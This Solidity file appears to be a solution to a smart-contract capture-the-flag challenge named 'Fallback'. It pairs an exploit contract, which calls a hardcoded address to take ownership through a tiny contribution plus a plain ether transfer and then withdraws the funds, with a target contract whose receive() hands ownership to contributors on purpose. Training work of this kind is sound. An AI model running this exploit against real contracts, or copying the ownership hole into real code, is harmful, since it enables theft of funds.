// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

//import '@openzeppelin/contracts/math/SafeMath.sol';

contract FallbackSolution {

    constructor() payable {}

    function solve() public {
        address contractAddr = 0x9CB391dbcD447E645D6Cb55dE6ca23164130D008;
        (bool success1,) = contractAddr.call{value: 1 wei}(abi.encode(bytes4(keccak256("contribute()"))));
        if(!success1)
            revert();
        contractAddr.call{value: 1 wei}("");
        (bool success,) = contractAddr.call(abi.encode(bytes4(keccak256("withdraw()"))));
        if(!success)
            revert();
    }

    receive() external payable {}
}


contract Fallback {

  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = payable(msg.sender);
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = payable(msg.sender);
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = payable(msg.sender);
  }
}

